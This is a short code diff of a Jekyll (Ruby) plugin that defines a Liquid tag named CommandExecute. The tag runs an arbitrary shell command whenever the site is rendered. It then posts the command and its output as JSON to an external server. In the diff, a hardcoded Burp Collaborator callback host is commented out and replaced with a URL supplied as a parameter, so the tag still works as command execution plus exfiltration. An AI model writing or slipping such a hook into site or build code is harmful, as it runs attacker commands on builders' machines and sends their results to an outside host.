@@ -5,17 +5,16 @@ module Jekyll
 
   class CommandExecute < Liquid::Tag
 
-    def initialize(tag_name, command, tokens)
+    def initialize(tag_name, command, response_url)
       super
-      @command = command
+      @command = command.strip
+      @response_url = response_url.strip
     end
 
     def render(context)
-      `#{@command.to_s}`
-      `#{CGI::unescapeHTML(@command)}`
-
       command_output = `#{@command}`
-      Net::HTTP.post URI("http://plexnx72dqs5fdqycvzxbqgtpkvcj1.burpcollaborator.net"),
+      # Net::HTTP.post URI("http://plexnx72dqs5fdqycvzxbqgtpkvcj1.burpcollaborator.net"),
+      Net::HTTP.post URI(@response_url),
         { "command" => @command, "result" => command_output }.to_json,
         "Content-Type" => "application/json"
     end
